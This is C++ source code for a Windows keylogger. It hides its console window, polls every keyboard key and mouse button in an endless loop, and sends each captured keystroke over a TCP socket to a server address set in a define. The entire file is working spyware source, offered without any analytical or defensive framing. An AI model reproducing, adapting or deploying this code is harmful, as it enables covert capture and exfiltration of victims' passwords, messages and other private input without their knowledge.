#include <iostream>   // For input/output
#include <winsock2.h> // For socket programming

#include <windows.h>  // For general Windows system functions
#include <winuser.h>  // For dealing with keyboard keys and mouse events
#include <fstream>    // For file operations
#include <string>     // For string manipulation
#include <thread>     // For multithreading

#pragma comment(lib, "ws2_32.lib")  // Link with Winsock library

using namespace std;

#define SERVER_IP "127.0.0.1"  
#define PORT 8080

SOCKET sock;

// Function prototypes
void initSocket();
void logKeys();
void hideConsole();

int main() {
    hideConsole();  // Hide the console window
    initSocket();   // Initialize socket connection
    thread logger(logKeys);  // Start keylogging in a separate thread
    logger.join();           // Keep the keylogger running
    closesocket(sock);
    WSACleanup();
    return 0;
}

// Function to initialize the socket connection
void initSocket() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);  // Initialize Winsock
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock == INVALID_SOCKET) {
        cerr << "Socket creation failed!" << endl;
        exit(EXIT_FAILURE);
    }

    sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);


    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        cerr << "Connection to the server failed!" << endl;
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    cout << "Connected to server!" << endl;
}

// Keylogger function
void logKeys() {
    char c;
    bool keyState[256] = {0};  // Array to track status, whether pressed or not

    while (true) {  // Run indefinitely
        for (c = 1; c <= 254; c++) {  // Loop for all keys
            if (GetAsyncKeyState(c) & 0x8000) {  // Check if the key is pressed
                if (!keyState[c]) {  // If this key hasn't been logged yet
                    keyState[c] = true;  // Mark this key as logged

                    string logEntry;

                    // Handle mouse buttons
                    if (c == VK_LBUTTON) {
                        logEntry = "[left-click] ";
                    } else if (c == VK_RBUTTON) {
                        logEntry = "[right-click] ";
                    } 
                    // Handle special keys and letters
                    else {
                        switch (c) {
                            case VK_BACK:
                                logEntry = "[backspace] ";
                                break;
                            case VK_RETURN:
                                logEntry = "[enter] ";
                                break;
                            case VK_SHIFT:
                                logEntry = "[shift] ";
                                break;
                            case VK_CONTROL:
                                logEntry = "[control] ";
                                break;
                            case VK_CAPITAL:
                                logEntry = "[capslock] ";
                                break;
                            case VK_TAB:
                                logEntry = "[tab] ";
                                break;
                            case VK_MENU:
                                logEntry = "[alt] ";
                                break;
                            case VK_SPACE:
                                logEntry = " ";
                                break;
                            case VK_ESCAPE:
                                logEntry = "[esc] ";
                                break;
                            case VK_UP:
                                logEntry = "[up-arrow] ";
                                break;
                            case VK_DOWN:
                                logEntry = "[down-arrow] ";
                                break;
                            case VK_LEFT:
                                logEntry = "[left-arrow] ";
                                break;
                            case VK_RIGHT:
                                logEntry = "[right-arrow] ";
                                break;
                            default:
                                // Handle alphanumeric and other keys
                                if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
                                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                                    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

                                    if ((capsLockOn && !shiftPressed) || (!capsLockOn && shiftPressed)) {
                                        logEntry = string(1, c);  // Uppercase
                                    } else {
                                        logEntry = string(1, tolower(c));  // Lowercase
                                    }
                                } else {
                                    logEntry = "[key:" + to_string((int)c) + "]";  // Log unhandled keys
                                }
                        }
                    }

                    // Send log entry to the server
                    if (!logEntry.empty()) {
                        send(sock, logEntry.c_str(), logEntry.size(), 0);
                    }
                }
            } else {
                keyState[c] = false;  // Reset key when released
            }
        }
        Sleep(10);  // Add a small delay to reduce CPU usage
    }
}

// Function to hide the console window
void hideConsole() {
    HWND hWnd = GetConsoleWindow();  // Get the console window handle
    ShowWindow(hWnd, SW_HIDE);       // Hide the console window
}
